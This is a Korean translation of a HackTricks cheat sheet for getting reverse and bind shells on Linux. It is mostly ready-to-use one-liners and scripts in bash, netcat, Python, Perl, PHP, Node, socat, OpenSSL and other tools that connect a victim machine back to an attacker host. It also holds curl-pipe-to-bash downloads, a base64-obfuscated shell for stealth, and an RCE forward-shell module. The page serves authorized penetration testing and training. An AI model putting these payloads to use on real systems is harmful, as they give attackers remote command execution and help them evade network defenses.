# 셸 - Linux

{{#include ../../banners/hacktricks-training.md}}

**이러한 셸에 대해 궁금한 점이 있다면** [**https://explainshell.com/**](https://explainshell.com)에서 **확인할 수 있습니다.**

## Full TTY

**reverse shell을 획득한 후에는**[ **이 페이지를 읽고 Full TTY를 얻으세요.**](full-ttys.md)**

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
다른 shell도 확인하는 것을 잊지 마세요: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash.

### Symbol safe shell
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### Shell 설명

1. **`bash -i`**: 이 명령의 해당 부분은 대화형(`-i`) Bash shell을 시작합니다.
2. **`>&`**: 이 명령의 해당 부분은 **표준 출력**(`stdout`)과 **표준 오류**(`stderr`)를 **동일한 대상**으로 **redirecting**하는 축약 표기입니다.
3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: 이는 **지정된 IP 주소와 port에 대한 TCP connection을 나타내는** 특수 파일입니다.
- **출력 및 오류 stream을 이 파일로 redirecting하면**, 이 명령은 대화형 shell session의 출력을 공격자의 machine으로 효과적으로 전송합니다.
4. **`0>&1`**: 이 명령의 해당 부분은 **표준 입력**(`stdin`)을 **표준 출력**(`stdout)과 동일한 대상**으로 **redirecting**합니다.

### 파일에 생성하고 실행
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## Forward Shell

Linux 기반 web application 내 **Remote Code Execution (RCE)** vulnerability를 다룰 때, reverse shell을 획득하는 과정이 iptables rules 또는 복잡한 packet filtering mechanisms와 같은 network defenses에 의해 차단될 수 있습니다. 이러한 제한된 환경에서는 compromised system과 보다 효과적으로 상호작용하기 위해 PTY (Pseudo Terminal) shell을 설정하는 alternative approach를 사용할 수 있습니다.

이를 위해 권장되는 tool은 [toboggan](https://github.com/n3rada/toboggan.git)이며, target environment와의 interaction을 간소화합니다.

toboggan을 효과적으로 사용하려면 target system의 RCE context에 맞는 Python module을 생성해야 합니다. 예를 들어 `nix.py`라는 module은 다음과 같이 구성할 수 있습니다:
```python3
import jwt
import httpx

def execute(command: str, timeout: float = None) -> str:
# Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
token = jwt.encode(
{"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
)

response = httpx.get(
url="https://vulnerable.io:3200",
headers={"Authorization": f"Bearer {token}"},
timeout=timeout,
# ||BURP||
verify=False,
)

# Check if the request was successful
response.raise_for_status()

return response.text
```
그런 다음 다음을 실행할 수 있습니다:
```shell
toboggan -m nix.py -i
```
직접 대화형 셸을 활용하려면 다음과 같이 할 수 있습니다. Burpsuite 통합을 위해 `-b`를 추가하고, 더 기본적인 rce wrapper를 사용하려면 `-i`를 제거합니다.

또 다른 방법은 `IppSec`의 forward shell 구현을 사용하는 것입니다 [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).

다음 항목만 수정하면 됩니다:

- 취약한 호스트의 URL
- payload의 prefix와 suffix(있는 경우)
- payload가 전송되는 방식(headers? data? extra info?)

그런 다음 **send commands**를 실행하거나, **`upgrade` command**를 사용해 full PTY를 얻을 수 있습니다(파이프는 약 1.3초의 지연을 두고 읽고 쓰는 점에 유의하세요).

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## BusyBox

**routers**, **embedded devices**, **containers**, 그리고 최소 구성 Linux appliance에서 매우 흔하게 사용됩니다. 독립 실행형 `nc`가 없다면 BusyBox에서 이를 제공하는지 확인하세요:<sup>[[8]](#references)</sup>
```bash
busybox --list-full | grep -E '(^|/)nc$'
busybox nc <ATTACKER-IP> <PORT> -e /bin/sh
busybox nc <ATTACKER-IP> <PORT> -e sh
```
`busybox nc`가 존재하지만 interactive 실행이 불안정한 경우, 일반적으로 `nc` 섹션의 FIFO 패턴은 여전히 작동합니다:
```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER-IP> <PORT> >/tmp/f
```
## gsocket

[https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)에서 확인하세요.
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## Telnet
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**공격자**
```bash
while true; do nc -l <port>; done
```
명령을 보내려면 명령을 입력하고 Enter를 누른 다음 CTRL+D를 누르세요(STDIN을 중지하려면)<sup>[[3]](#references)</sup>

**피해자**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## Perl
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat
```bash
victim> ncat <ip> <port,eg.443> --ssl  -c  "bash -i 2>&1"
attacker> ncat -l <port,eg.443> --ssl
```
## Golang
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## Zsh (내장 TCP)
```bash
# Requires no external binaries; leverages zsh/net/tcp module
zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
```
## Rustcat (rcat)

[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – Rust로 작성된 modern netcat-like listener (2024년부터 Kali에 포함됨).<sup>[[5]](#references)</sup>
```bash
# Attacker – interactive TLS listener with history & tab-completion
rcat listen -ib 55600

# Victim – download static binary and connect back with /bin/bash
curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_64 -o /tmp/rcat \
&& chmod +x /tmp/rcat \
&& /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
```
기능:
- 암호화된 전송을 위한 선택적 `--ssl` 플래그(TLS 1.3)
- 피해자에서 모든 바이너리(예: `/bin/sh`, `python3`)를 실행하기 위한 `-s`
- 완전한 interactive PTY로 자동 업그레이드하기 위한 `--up`

## pwncat-cs

이미 **raw reverse shell**을 보유하고 있지만 이를 더 사용하기 편한 세션으로 자동 업그레이드하려는 경우, `pwncat-cs`는 일반적인 `nc -lvnp` listener를 대체할 수 있는 최신 도구입니다.<sup>[[7]](#references)</sup>
```bash
# Attacker - catch a plain reverse shell and auto-upgrade it when possible
python3 -m pip install --user pwncat-cs
pwncat-cs -lp 4444

# Victim - reuse any payload from this page
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
```
또한 **암호화된** `ssl-bind` 및 `ssl-connect` 채널을 지원하므로, 전송 암호화가 필요할 때 `ncat --ssl` 또는 `socat OPENSSL:` payload와 함께 사용할 수 있습니다.<sup>[[7]](#references)</sup>

## revsh (암호화 및 pivot-ready)

`revsh`는 **암호화된 Diffie-Hellman 터널**을 통해 전체 TTY를 제공하며, reverse VPN과 유사한 pivoting을 위해 선택적으로 **TUN/TAP** 인터페이스를 연결할 수 있는 소형 C client/server입니다.<sup>[[6]](#references)</sup>
```bash
# Build (or grab a pre-compiled binary from the releases page)
git clone https://github.com/emptymonkey/revsh && cd revsh && make

# Attacker – controller/listener on 443 with a pinned certificate
revsh -c 0.0.0.0:443 -key key.pem -cert cert.pem

# Victim – reverse shell over TLS to the attacker
./revsh <ATTACKER-IP>:443
```
유용한 flags:
- `-b` : reverse 대신 bind-shell
- `-p socks5://127.0.0.1:9050` : TOR/HTTP/SOCKS를 통해 proxy
- `-t` : TUN interface 생성 (reverse VPN)

전체 session이 암호화되고 multiplex되므로, 일반 텍스트 `/dev/tcp` shell을 차단하는 단순한 egress filtering을 우회하는 경우가 많습니다.

## OpenSSL

**single-port encrypted reverse shell**은 `443`을 통해 proxy하기 쉽고 자동화가 더 간단하므로, 일반적인 two-listener pattern보다 실용적인 경우가 많습니다.

공격자 (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port>
```
피해자
```bash
#Linux - one-port TLS shell using a named pipe
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s

#If the target needs SNI / hostname validation to blend with a fronted TLS service
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -servername <DOMAIN> -verify_return_error -verify_hostname <DOMAIN> -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
```
분리된 입력/출력 채널을 원할 때는 여전히 전통적인 **two-listener** 패턴을 사용할 수 있습니다:
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
## Finger

**공격자**
```bash
while true; do nc -l 79; done
```
명령을 전송하려면 명령을 입력하고 Enter를 누른 다음 CTRL+D를 누르세요(STDIN을 중지하려면)<sup>[[3]](#references)</sup>

**피해자**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

이 명령은 포트 6001에서 사용자의 시스템에 연결을 시도합니다:
```bash
xterm -display 10.0.0.1:1
```
reverse shell을 수신하려면 다음을 사용할 수 있습니다(포트 6001에서 수신 대기):
```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```
## Groovy

작성자 [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) 참고: Java reverse shell도 Groovy에서 작동합니다.
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## References

- [1] [Reverse Shell Cheat Sheet: PHP, ASP, Netcat, Bash & Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [2] [Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [3] [Using Whois and Finger for Reverse Shells](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
- [4] [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [5] [rustcat - The modern port listener and reverse shell](https://github.com/robiot/rustcat)
- [6] [revsh - A reverse shell with terminal support, data tunneling, and advanced pivoting capabilities](https://github.com/emptymonkey/revsh)
- [7] [pwncat (pwncat-cs) - post-exploitation platform](https://github.com/calebstewart/pwncat)
- [8] [busybox | GTFOBins](https://gtfobins.org/gtfobins/busybox/)

{{#include ../../banners/hacktricks-training.md}}
